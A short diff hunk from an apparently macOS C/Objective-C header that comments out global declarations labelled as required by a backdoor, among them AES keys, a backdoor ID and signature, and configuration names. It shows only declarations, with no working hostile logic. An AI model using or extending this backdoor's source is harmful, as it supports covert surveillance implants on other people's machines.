@@ -611,14 +611,14 @@ typedef union {
 //
 // Global variables required by the backdoor
 //
-extern char     gLogAesKey[];
-extern char     gConfAesKey[];
-extern char     gInstanceId[];
-extern char     gBackdoorID[];
-extern char     gBackdoorSignature[];
-extern char     gConfName[];
-extern char     gDemoMarker[];
-extern u_int    gVersion;
+//extern char     gLogAesKey[];
+//extern char     gConfAesKey[];
+//extern char     gInstanceId[];
+//extern char     gBackdoorID[];
+//extern char     gBackdoorSignature[];
+//extern char     gConfName[];
+//extern char     gDemoMarker[];
+//extern u_int    gVersion;
 extern FILE     *logFD;
 extern NSString *gDylibName;
 extern NSString *gBackdoorName;
